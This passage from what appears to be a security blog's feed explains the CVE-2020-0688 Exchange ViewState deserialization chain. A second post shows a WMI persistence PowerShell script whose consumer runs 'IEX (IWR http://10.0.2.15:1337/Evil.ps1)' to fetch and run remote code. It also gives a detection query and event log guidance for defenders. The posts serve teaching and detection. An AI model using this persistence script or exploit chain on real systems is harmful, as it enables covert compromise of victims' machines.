        public sealed class TextFormattingRunProperties : 
        System.Windows.Media.TextFormatting.TextRunProperties, 
        System.Runtime.Serialization.IObjectReference, 
        System.Runtime.Serialization.ISerializable&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
        &lt;p&gt;The next thing we will have a look at are methods which belong to the gadget class and have something to do with serialization. As you can see in the figure below the gadget class implements its own &lt;code class=&quot;highlighter-rouge&quot;&gt;GetObjectData()&lt;/code&gt; method as demanded by the &lt;code class=&quot;highlighter-rouge&quot;&gt;ISerializable&lt;/code&gt; interface. The interesting part from the method description is the mentioning of the class &lt;code class=&quot;highlighter-rouge&quot;&gt;XamlWriter&lt;/code&gt;. This is a clear sign that objects created from our gadget class a serialized and deserialized with the help of &lt;code class=&quot;highlighter-rouge&quot;&gt;XamlWriter&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;XamlReader&lt;/code&gt;.&lt;/p&gt;
        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2020/04/post1/images/7.png&quot; alt=&quot;Figure 7: TextFormattingRunProperties.GetObjectData()&quot; title=&quot;TextFormattingRunProperties.GetObjectData()&quot; /&gt;&lt;/p&gt;
        &lt;p&gt;Remember what happens when a custom .NET object gets deserialized? No!? Let me help you. The answer is that a special constructor is called which in the case of our gadget class &lt;code class=&quot;highlighter-rouge&quot;&gt;TextFormattingRunProperties&lt;/code&gt; looks as follows:&lt;/p&gt;
        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;TextFormattingRunProperties.ctor(SerializationInfo, StreamingContext)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
        &lt;p&gt;Inside this special constructor used for deserialization purposes a method named &lt;code class=&quot;highlighter-rouge&quot;&gt;GetObjectFromSerializationInfo()&lt;/code&gt; is called on each property of our gadget class that needs to be deserialized. The serialized properties are retrieved from the &lt;code class=&quot;highlighter-rouge&quot;&gt;SerializationInfo&lt;/code&gt; object passed to the method.&lt;/p&gt;
        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2020/04/post1/images/8.png&quot; alt=&quot;Figure 8: TextFormattingRunProperties.GetObjectFromSerializationInfo()&quot; title=&quot;TextFormattingRunProperties.GetObjectFromSerializationInfo()&quot; /&gt;&lt;/p&gt;
        &lt;p&gt;In the figure above you can see what happens inside the method &lt;code class=&quot;highlighter-rouge&quot;&gt;GetObjectFromSerializationInfo()&lt;/code&gt;. Note that the method &lt;code class=&quot;highlighter-rouge&quot;&gt;XamlReader.Parse()&lt;/code&gt; is called on the property &lt;code class=&quot;highlighter-rouge&quot;&gt;ForegroundBrush&lt;/code&gt; which contains the XAML we have seen before.&lt;/p&gt;
        &lt;p&gt;What happend so far is that we attempted to deserialize the gadget of type &lt;code class=&quot;highlighter-rouge&quot;&gt;TextFormattingRunProperties&lt;/code&gt; with the help of &lt;code class=&quot;highlighter-rouge&quot;&gt;LosFormatter&lt;/code&gt;. During deserialization each object of a specific type that is part of the object graph gets deserialized in its intended way. This involves calling the specialized constructor introduced earlier in this section. The result of calling the specialized constructor is that &lt;code class=&quot;highlighter-rouge&quot;&gt;XamlReader.Parse()&lt;/code&gt; will be called on each property of class such as &lt;code class=&quot;highlighter-rouge&quot;&gt;ForegroundBrush&lt;/code&gt;. The magic begins when we pass the contents of &lt;code class=&quot;highlighter-rouge&quot;&gt;ForegroundBrush&lt;/code&gt; (XAML) into the &lt;code class=&quot;highlighter-rouge&quot;&gt;Parse()&lt;/code&gt; method.&lt;/p&gt;
        &lt;p&gt;At this point &lt;code class=&quot;highlighter-rouge&quot;&gt;XamlReader.Parse()&lt;/code&gt; will take care of the XAML content present in the property &lt;code class=&quot;highlighter-rouge&quot;&gt;ForegroundBrush&lt;/code&gt;. After parsing the XAML definitions an object of type &lt;code class=&quot;highlighter-rouge&quot;&gt;ObjectDataProvider&lt;/code&gt; will be instantiated. The class &lt;code class=&quot;highlighter-rouge&quot;&gt;ObjectDataProvider&lt;/code&gt; is responsible for creating an object that can be used as a binding source for Windows Presentation Foundation (WPF) application GUI elements.&lt;/p&gt;
        &lt;p&gt;A binding source can be described as the association between an GUI element (e.g. WPF Window) and a method which is responsible for creating or fetching data used by that GUI element. This association is described in XAML. The best part about &lt;code class=&quot;highlighter-rouge&quot;&gt;ObjectDataProviders&lt;/code&gt; from an attackers point of view is that they provide a way to execute code on a target that can be tricked into calling &lt;code class=&quot;highlighter-rouge&quot;&gt;XamlReader.Parse()&lt;/code&gt; on a malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;ObjectDataProviders&lt;/code&gt; XAML definition.&lt;/p&gt;
        &lt;p&gt;Guess what!? This is exactly what is happening in our example! As we will explorer in the next section.&lt;/p&gt;
        &lt;h2 id=&quot;wrapping-it-all-up&quot;&gt;Wrapping it all up&lt;/h2&gt;
        &lt;p&gt;We are first defining a malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;ObjectDataProvider&lt;/code&gt; (in XAML) that gets assigned to our &lt;code class=&quot;highlighter-rouge&quot;&gt;payload&lt;/code&gt; variable which in turn becomes part of the &lt;code class=&quot;highlighter-rouge&quot;&gt;ForegroundBrush&lt;/code&gt; property of our gadget class &lt;code class=&quot;highlighter-rouge&quot;&gt;TextFormattingRunProperties&lt;/code&gt;.&lt;/p&gt;
        &lt;p&gt;In the second step we serialize our gadget class with the help of the formatter &lt;code class=&quot;highlighter-rouge&quot;&gt;LosFormatter&lt;/code&gt;. Based on the serialized gadget and the cryptographic parameters introduced in one of the previous sections an HMAC is computed which is then appended to the serialized gadget. The resulting structure is called view state.&lt;/p&gt;
        &lt;p&gt;In the next step the malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;__VIEWSTATE&lt;/code&gt; is send back the the vulnerable ASP.NET web application part of Microsoft Exchange. The HTTP GET-Request is shown below.&lt;/p&gt;
        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;/ecp/default.aspx?__VIEWSTATEGENERATOR=&amp;lt;value&amp;gt;&amp;amp;__VIEWSTATE=&amp;lt;value&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
        &lt;p&gt;After receiving the view state the ASP.NET web application uses the &lt;code class=&quot;highlighter-rouge&quot;&gt;LosFormatter.Deserialize()&lt;/code&gt; method to deserialize its contents.&lt;/p&gt;
        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;public object Deserialize(string input) {
        #if NO_BASE64
        char[] data = input.ToCharArray();
        #else
        byte[] dataBytes = Convert.FromBase64String(input);
        int dataLength = -1;
        if (EnableViewStateMac) {
        try {
        dataBytes = MachineKeySection.GetDecodedData(dataBytes, _macKey, 0, dataBytes.Length, ref dataLength);
        }
        catch (Exception e) {
        PerfCounters.IncrementCounter(AppPerfCounter.VIEWSTATE_MAC_FAIL);
        ViewStateException.ThrowMacValidationError(e, input);
        }
        }
        ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
        &lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;LosFormatter&lt;/code&gt; uses the specialized constructor of the serialized &lt;code class=&quot;highlighter-rouge&quot;&gt;TextFormattingRunProperties&lt;/code&gt; object to deserialize its properties. Additionally the &lt;code class=&quot;highlighter-rouge&quot;&gt;ForegroundBrush&lt;/code&gt; which holds the malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;ObjectDataProvider&lt;/code&gt; (in XAML) gets passed into &lt;code class=&quot;highlighter-rouge&quot;&gt;XamlReader.Parse()&lt;/code&gt; as part of a a function call to &lt;code class=&quot;highlighter-rouge&quot;&gt;GetObjectFromSerializationInfo()&lt;/code&gt; (Boooom!!!).&lt;/p&gt;
        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2020/04/post1/images/9.png&quot; alt=&quot;Figure 9: ObjectDataProvider.InvokeMethodOnInstance()&quot; title=&quot;ObjectDataProvider.InvokeMethodOnInstance()&quot; /&gt;&lt;/p&gt;
        &lt;p&gt;Finally the &lt;code class=&quot;highlighter-rouge&quot;&gt;ObjectDataProvider&lt;/code&gt; object gets instantiated, and the method &lt;code class=&quot;highlighter-rouge&quot;&gt;System.Diagnostics.Process.start()&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;System.dll&lt;/code&gt; is invoked with the help of another method called &lt;code class=&quot;highlighter-rouge&quot;&gt;ObjectDataProvider.InvokeMethodOnInstance()&lt;/code&gt; as can be seen in the figure above. The &lt;code class=&quot;highlighter-rouge&quot;&gt;start()&lt;/code&gt; method is used to execute &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd.exe&lt;/code&gt; with the commandline &lt;code class=&quot;highlighter-rouge&quot;&gt;/c calc.exe&lt;/code&gt;. This results in the creation of a &lt;code class=&quot;highlighter-rouge&quot;&gt;calc.exe&lt;/code&gt; process or a full compromise of the targeted Microsoft Exchange Server.&lt;/p&gt;
        &lt;hr /&gt;
        &lt;p&gt;Want to see something else added? &lt;a href=&quot;https://github.com/digital-selfdefense-net/digital-selfdefense-net.github.io/issues/new&quot;&gt;Open an issue.&lt;/a&gt;&lt;/p&gt;
        &lt;div class=&quot;footnotes&quot;&gt;
        &lt;ol&gt;
        &lt;li id=&quot;fn:fn-CVE_2020_0688&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0688&quot;&gt;Microsoft: CVE-2020-0688&lt;/a&gt; &lt;a href=&quot;#fnref:fn-CVE_2020_0688&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-ZDI&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys&quot;&gt;Zero Day Initiative: CVE-2020-0688&lt;/a&gt; &lt;a href=&quot;#fnref:fn-ZDI&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-yososerial_ViewStatePlugin&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Plugins/ViewStatePlugin.cs&quot;&gt;Yososerial.net: ViewStatePlugin.cs&lt;/a&gt; &lt;a href=&quot;#fnref:fn-yososerial_ViewStatePlugin&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-github_yoserialnet&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://github.com/pwntester/ysoserial.net&quot;&gt;Github: yoserial.net&lt;/a&gt; &lt;a href=&quot;#fnref:fn-github_yoserialnet&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-microsoft_MachineKeySection&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://github.com/microsoft/referencesource/blob/master/System.Web/Configuration/MachineKeySection.cs&quot;&gt;Microsoft: MachineKeySection.cs&lt;/a&gt; &lt;a href=&quot;#fnref:fn-microsoft_MachineKeySection&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-New_Gadget&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://community.microfocus.com/t5/Security-Research-Blog/New-NET-deserialization-gadget-for-compact-payload-When-size/ba-p/1763282&quot;&gt;Micro Focus: New .NET deserialization gadget for compact payload&lt;/a&gt; &lt;a href=&quot;#fnref:fn-New_Gadget&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-microsoft_LosFormatter&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://github.com/microsoft/referencesource/blob/master/System.Web/UI/LOSFormatter.cs&quot;&gt;Microsoft: LosFormatter.cs&lt;/a&gt; &lt;a href=&quot;#fnref:fn-microsoft_LosFormatter&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;/ol&gt;
        &lt;/div&gt;
      </content>
    </entry>
    <entry>
      <title>WMI Persistence (T1084)</title>
      <link href="https://digital-selfdefense.net/2020/01/19/WMI-Persistence.html"/>
      <updated>2020-01-19T11:00:00+01:00</updated>
      <id>https://digital-selfdefense.net/2020/01/19/WMI-Persistence</id>
      <content type="html">&lt;div class=&quot;message&quot;&gt;
        Hello, DFIR Folks! In this blog post we will take a quick look at how threat actors can utilize Windows Management Instrumentation (WMI) Event Consumers to obtain persistence 
        on a compromised windows machine, and how we as Defenders can detect these kind of malicious activities by using PowerShell and the Windows Event Log.  
        &lt;/div&gt;
        &lt;p&gt;Now, Let’s jump straight into the first section of our blog post which is meant as a short introduction to key terms such as WMI filters, consumers&lt;sup id=&quot;fnref:fn-MITRE_T1084&quot;&gt;&lt;a href=&quot;#fn:fn-MITRE_T1084&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; and bindings.&lt;/p&gt;
        &lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
        &lt;p&gt;In comparision to traditional persistence mechanisms such as autostart, services, scheduled task or run keys (registry), WMI event consumers are one of the lesser know persistence mechanisms in Microsoft Windows. Even the most seasoned windows administrators will rarely get in touch with WMI event consumers. The lack of knowledge about this persistence mechanism is the main reason why WMI event consumers are so popular among threat actors.&lt;/p&gt;
        &lt;p&gt;WMI at it’s core is a database (&lt;code class=&quot;highlighter-rouge&quot;&gt;%windir%\System32\Wbem\Repository&lt;/code&gt;) which contains standardized definitions of system information, which can be collected from different parts of the operating system and it’s components. This information is organized by using namespaces and classes. A big part of the class definitions in the WMI repository (database)&lt;sup id=&quot;fnref:fn-WMI_Repository&quot;&gt;&lt;a href=&quot;#fn:fn-WMI_Repository&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; stem from WMI providers which are responsible for monitoring and collecting information from managed objects such as processes, services or other parts of the operating system. This information is then made available by providing a uniform interface for WMI clients that can query management data from computer systems. When a WMI client queries data from a specific WMI provider&lt;sup id=&quot;fnref:fn-WMI_Provider&quot;&gt;&lt;a href=&quot;#fn:fn-WMI_Provider&quot; class=&quot;footnote&quot;&gt;3&lt;/a&gt;&lt;/sup&gt; class, WMI will dynamically fetch the data from the responsible WMI provider.&lt;/p&gt;
        &lt;p&gt;One of the greatest features of WMI is that it allows us to subscribe to specific system events like process starts by subscribing to event notifications&lt;sup id=&quot;fnref:fn-Monitoring_Events&quot;&gt;&lt;a href=&quot;#fn:fn-Monitoring_Events&quot; class=&quot;footnote&quot;&gt;4&lt;/a&gt;&lt;/sup&gt; from WMI providers such as the &lt;code class=&quot;highlighter-rouge&quot;&gt;Win32_Process&lt;/code&gt;&lt;sup id=&quot;fnref:fn-Win32_Process&quot;&gt;&lt;a href=&quot;#fn:fn-Win32_Process&quot; class=&quot;footnote&quot;&gt;5&lt;/a&gt;&lt;/sup&gt;. Whenever a specific system event occurs like for example a process start then the responsible WMI provider will be notified about this event. Subscribing to reguraly occuring system events is a good way to maintain persistence.&lt;/p&gt;
        &lt;p&gt;If you are interested in a detailed introduction to the the WMI architecture take a look at &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-architecture&quot;&gt;this&lt;/a&gt;.&lt;/p&gt;
        &lt;h2 id=&quot;gaining-persistence&quot;&gt;Gaining Persistence&lt;/h2&gt;
        &lt;p&gt;What are these mysterious WMI event consumers? You might ask yourself at this point. To find an answer to this question let’s take a look at the official documentation provided by Microsoft which can be found &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/wmisdk/monitoring-events&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
        &lt;p&gt;&lt;cite&gt;“Event consumers are applications or scripts that request notification of events, and then perform tasks when specific events occur. You can create event monitoring scripts or applications that temporarily monitor when events occur.”&lt;/cite&gt;&lt;/p&gt;
        &lt;p&gt;There are two types of event consumers, “temporary event consumers” and “permanent event consumers”&lt;sup id=&quot;fnref:fn-Consumer_Types&quot;&gt;&lt;a href=&quot;#fn:fn-Consumer_Types&quot; class=&quot;footnote&quot;&gt;6&lt;/a&gt;&lt;/sup&gt;. For the majority of threat actors it is desirable to maintain persistence for as long as possible, therefore it is highly likely that permanent event consumers will be used. The following PowerShell-Script named &lt;code class=&quot;highlighter-rouge&quot;&gt;Get-WmiPersistence.ps1&lt;/code&gt; is an example of how PowerShell can be used to gain persistence on a compromised windows machine.&lt;/p&gt;
        &lt;p&gt;In the first part of the PowerShell-Script we use the &lt;code class=&quot;highlighter-rouge&quot;&gt;Set-WmiInstance&lt;/code&gt;&lt;sup id=&quot;fnref:fn-Set_WmiInstance&quot;&gt;&lt;a href=&quot;#fn:fn-Set_WmiInstance&quot; class=&quot;footnote&quot;&gt;7&lt;/a&gt;&lt;/sup&gt; cmdlet to instantiate the WMI class &lt;code class=&quot;highlighter-rouge&quot;&gt;__EventFilter&lt;/code&gt;. In simple terms event filters are the conditions used by WMI to decide when to execute the associated event consumer (defined later in this script). As can be seen in the excerpt below the condition is defined using the WMI Query Langauge (WQL)&lt;sup id=&quot;fnref:fn-WQL&quot;&gt;&lt;a href=&quot;#fn:fn-WQL&quot; class=&quot;footnote&quot;&gt;8&lt;/a&gt;&lt;/sup&gt;. The presented WQL query requests that WMI check every 5 seconds for the creation of instances of the &lt;code class=&quot;highlighter-rouge&quot;&gt;Win32_Process&lt;/code&gt; class, which have the name &lt;code class=&quot;highlighter-rouge&quot;&gt;notepad.exe&lt;/code&gt;. If an instance of the class is created within the specified polling interval, a notification event is sent. This results in the execution of the WMI event consumer. To put it in a nutshell, everytime an instance of &lt;code class=&quot;highlighter-rouge&quot;&gt;notepad.exe&lt;/code&gt; is created the WMI consumer associtated with this event filter will be executed.&lt;/p&gt;
        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
        EventNamespace = 'root/CIMV2'
        Name = 'Malicious Filter'
        Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA &quot;Win32_Process&quot; AND TargetInstance.Name = &quot;notepad.exe&quot;'
        QueryLanguage = 'WQL'
        }&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
        &lt;p&gt;In the second part of our PowerShell-Script a malicious commandline event consumer is defined which will be executed whenever the filter condition is met. There are different types of event consumers but the most popular among Threat Actors are &lt;code class=&quot;highlighter-rouge&quot;&gt;CommandLineEventConsumer&lt;/code&gt; (used here) and &lt;code class=&quot;highlighter-rouge&quot;&gt;ActiveScriptEventConsumer&lt;/code&gt;&lt;sup id=&quot;fnref:fn-Consumers&quot;&gt;&lt;a href=&quot;#fn:fn-Consumers&quot; class=&quot;footnote&quot;&gt;9&lt;/a&gt;&lt;/sup&gt;. The main difference between these two is that the first one is used to launch processes while the second one is used to execute scripts.&lt;/p&gt;
        &lt;p&gt;In this example a &lt;code class=&quot;highlighter-rouge&quot;&gt;powershell.exe&lt;/code&gt; process will be launched each time the filter condition is met (start of &lt;code class=&quot;highlighter-rouge&quot;&gt;notepad.exe&lt;/code&gt;). The &lt;code class=&quot;highlighter-rouge&quot;&gt;powershell.exe&lt;/code&gt; process uses &lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-WebRequest&lt;/code&gt;&lt;sup id=&quot;fnref:fn-Invoke_WebRequest&quot;&gt;&lt;a href=&quot;#fn:fn-Invoke_WebRequest&quot; class=&quot;footnote&quot;&gt;10&lt;/a&gt;&lt;/sup&gt; (IWR) to download a malicious PowerShell-Script named &lt;code class=&quot;highlighter-rouge&quot;&gt;Evil.ps1&lt;/code&gt; from the HTTP-Server &lt;code class=&quot;highlighter-rouge&quot;&gt;10.0.2.15&lt;/code&gt; controlled by the Threat Actor. The contents of the malicious PowerShell-Script &lt;code class=&quot;highlighter-rouge&quot;&gt;Evil.ps1&lt;/code&gt; are evaluated by &lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-Expression&lt;/code&gt;&lt;sup id=&quot;fnref:fn-Invoke_Expression&quot;&gt;&lt;a href=&quot;#fn:fn-Invoke_Expression&quot; class=&quot;footnote&quot;&gt;11&lt;/a&gt;&lt;/sup&gt; (IEX), which leads to their immediate execution on the compromised windows machine.&lt;/p&gt;
        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;$Command = 'powershell.exe -Command IEX (IWR http://10.0.2.15:1337/Evil.ps1)'
        $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
        Name = 'Malicious Consumer'
        CommandLineTemplate = $Command
        }&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
        &lt;p&gt;In the last part of the PowerShell-Script &lt;code class=&quot;highlighter-rouge&quot;&gt;Get-WmiPersistence.ps1&lt;/code&gt; the event filter and the event consumer are bind together. Which creates the necessery associtation between those two instances:&lt;/p&gt;
        &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Set-WmiInstance -Name root\subscription -Class __FilterToConsumerBinding -Arguments @{
        Filter = $Filter
        Consumer = $Consumer
        }&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
        &lt;p&gt;If you would like to experiment a little by yourself the complete PowerShell-Script &lt;code class=&quot;highlighter-rouge&quot;&gt;Get-WmiPersistence.ps1&lt;/code&gt; can be found &lt;a href=&quot;/assets/uploads/2020/01/post1/files/Get-WmiPersistence.ps1&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
        &lt;h2 id=&quot;execution-of-notepadexe&quot;&gt;Execution of notepad.exe&lt;/h2&gt;
        &lt;p&gt;As soon as the victim starts a new &lt;code class=&quot;highlighter-rouge&quot;&gt;notepad.exe&lt;/code&gt; process the WMI filter gets notified about this event and the associated WMI consumer gets executed.
        This leads to the execution of the PowerShell command definied in the commandline event consumer (&lt;code class=&quot;highlighter-rouge&quot;&gt;powershell.exe -Command IEX (IWR http://10.0.2.15:1337/Evil.ps1)&lt;/code&gt;). Please also note that commandline event consumers are executed by the parent process &lt;code class=&quot;highlighter-rouge&quot;&gt;WmiPrvSE.exe&lt;/code&gt; as can be seen in Figure 1. In comparison to commandline event consumers, active script event consumers get executed by the process &lt;code class=&quot;highlighter-rouge&quot;&gt;scrcons.exe&lt;/code&gt;.&lt;/p&gt;
        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2020/01/post1/images/1.png&quot; alt=&quot;Figure 1: Process Tree&quot; title=&quot;Process Tree&quot; /&gt;&lt;/p&gt;
        &lt;p&gt;On the attackers side the execution of the PowerShell command definied in the commandline event consumer results in a HTTP-Request from the compromised windows machine as shown in Figure 2. The requested ressource &lt;code class=&quot;highlighter-rouge&quot;&gt;Evil.ps1&lt;/code&gt; gets transfered to the victims machine, where it is executed immediately.&lt;/p&gt;
        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2020/01/post1/images/2.png&quot; alt=&quot;Figure 2: HTTP-Request&quot; title=&quot;HTTP-Request&quot; /&gt;&lt;/p&gt;
        &lt;p&gt;The contents of &lt;code class=&quot;highlighter-rouge&quot;&gt;Evil.ps1&lt;/code&gt; are left to the imagination of the reader ;-).&lt;/p&gt;
        &lt;h2 id=&quot;detecting-wmi-persistence&quot;&gt;Detecting WMI Persistence&lt;/h2&gt;
        &lt;p&gt;The easiest way to check if there are malicious WMI consumers installed on a system is to use the PowerShell cmdlet &lt;code class=&quot;highlighter-rouge&quot;&gt;Get-WmiObject&lt;/code&gt;&lt;sup id=&quot;fnref:fn-Get_WmiObject&quot;&gt;&lt;a href=&quot;#fn:fn-Get_WmiObject&quot; class=&quot;footnote&quot;&gt;12&lt;/a&gt;&lt;/sup&gt;. This cmdlet allows us to query the &lt;code class=&quot;highlighter-rouge&quot;&gt;root\Subscription&lt;/code&gt; namespace for instances of the class &lt;code class=&quot;highlighter-rouge&quot;&gt;CommandLineEventConsumer&lt;/code&gt;. The regex shown in Figure 3 is used to filter for commandline event consumers which indicate malicious PowerShell usage. As presented in Figure 3 we were able to locate the malicious commandline event consumer installed previously with the help of the PowerShell-Script &lt;code class=&quot;highlighter-rouge&quot;&gt;Get-WmiPersistence.ps1&lt;/code&gt;.&lt;/p&gt;
        &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Get-WmiObject -Namespace root\Subscription -Class CommandLineEventConsumer | Where CommandLineTemplate -iMatch &quot;(http(s)?\:|\.ps1|iex|iwr|webclient|([a-z]{3,}\-[a-z]{3,} ))&quot;&lt;/code&gt;&lt;/p&gt;
        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2020/01/post1/images/3.png&quot; alt=&quot;Figure 3: Get-WmiObject&quot; title=&quot;Get-WmiObject&quot; /&gt;&lt;/p&gt;
        &lt;p&gt;Depending on the logging capabilites available in your organization another great way to detect malicious WMI consumers is the use of event id 5861 from the &lt;code class=&quot;highlighter-rouge&quot;&gt;Microsoft-Windows-WMI-Activity&lt;/code&gt; log. In the exmaple below event id 5861 informs us about the creation of a permant commandline event consumer named &lt;code class=&quot;highlighter-rouge&quot;&gt;Malicious Consumer&lt;/code&gt;, with a &lt;code class=&quot;highlighter-rouge&quot;&gt;CommandLineTemplate&lt;/code&gt; value of &lt;code class=&quot;highlighter-rouge&quot;&gt;powershell.exe -Command IEX (IWR http://10.0.2.15:1337/Evil.ps1)&lt;/code&gt;.&lt;/p&gt;
        &lt;p&gt;&lt;img src=&quot;/assets/uploads/2020/01/post1/images/4.png&quot; alt=&quot;Figure 4: Event ID 5861&quot; title=&quot;Event ID 5861&quot; /&gt;&lt;/p&gt;
        &lt;p&gt;Looks familiar right? ;-).&lt;/p&gt;
        &lt;h2 id=&quot;final-thoughts&quot;&gt;Final Thoughts&lt;/h2&gt;
        &lt;p&gt;The lack of knowledge about WMI consumers and the resulting blind spot in the detection capabilities of many organizations is the reason why threat actors such as Cozy Bear or Turla tend to use WMI for persistence purposes. Since Microsoft provides excellent logging capabilities to detect malicious WMI activity there is no more execuse for not being able to detect these kinds of attacks.&lt;/p&gt;
        &lt;p&gt;If your are interestend in learning more about malicious WMI activity and how to detect it you should definitely check out the following two blog posts &lt;a href=&quot;https://www.darkoperator.com/blog/2017/10/14/basics-of-tracking-wmi-activity&quot;&gt;“Basics of Tracking WMI Activity”&lt;/a&gt; by &lt;a href=&quot;https://twitter.com/carlos_perez&quot;&gt;@Carlos_Perez&lt;/a&gt; and &lt;a href=&quot;https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/&quot;&gt;“Following the trace of WMI Backdoors &amp;amp; other nastiness”&lt;/a&gt; by &lt;a href=&quot;https://twitter.com/darkquassar&quot;&gt;@darkQuassar&lt;/a&gt;.&lt;/p&gt;
        &lt;hr /&gt;
        &lt;p&gt;Want to see something else added? &lt;a href=&quot;https://github.com/digital-selfdefense-net/digital-selfdefense-net.github.io/issues/new&quot;&gt;Open an issue.&lt;/a&gt;&lt;/p&gt;
        &lt;div class=&quot;footnotes&quot;&gt;
        &lt;ol&gt;
        &lt;li id=&quot;fn:fn-MITRE_T1084&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://attack.mitre.org/techniques/T1084/&quot;&gt;Windows Management Instrumentation Event Subscription&lt;/a&gt; &lt;a href=&quot;#fnref:fn-MITRE_T1084&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-WMI_Repository&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-architecture&quot;&gt;WMI Repository&lt;/a&gt; &lt;a href=&quot;#fnref:fn-WMI_Repository&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-WMI_Provider&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-providers&quot;&gt;WMI Providers&lt;/a&gt; &lt;a href=&quot;#fnref:fn-WMI_Provider&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-Monitoring_Events&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/wmisdk/monitoring-events&quot;&gt;Monitoring Events&lt;/a&gt; &lt;a href=&quot;#fnref:fn-Monitoring_Events&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
        &lt;/li&gt;
        &lt;li id=&quot;fn:fn-Win32_Process&quot;&gt;
        &lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-process&quot;&gt;Win32_Process&lt;/a&gt; &lt;a href=&quot;#fnref:fn-Win32_Process&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
